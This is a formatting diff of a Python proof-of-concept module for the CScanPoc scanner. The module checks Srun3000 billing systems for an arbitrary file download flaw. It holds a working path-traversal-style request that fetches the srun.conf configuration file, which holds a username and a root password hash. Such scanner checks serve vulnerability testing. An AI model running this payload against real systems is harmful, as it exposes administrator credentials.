@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Srun_0001' # 平台漏洞编号，留空
+    vuln_id = 'Srun_0001'  # 平台漏洞编号，留空
     name = 'Srun3000计费系统 任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2014-07-07'  # 漏洞公布时间
     desc = '''
         配置文件下载，内有root密码md5
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '深澜计费引擎'  # 漏洞应用名称
     product_version = 'Srun3000 [3.00rc14.17.4]'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'afe186a0-8b58-49df-baa9-8610dab702df'
@@ -33,13 +35,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #ref:http://wooyun.org/bugs/wooyun-2014-067666
+
+            # ref:http://wooyun.org/bugs/wooyun-2014-067666
             payload = '/index.php?action=login&ts=download&file=/srun3/etc/srun.conf'
             verify_url = self.target + payload
             req = urllib2.Request(verify_url)
             content = urllib2.urlopen(req).read()
-            
+
             if 'username' in content and 'root_pass' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -49,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
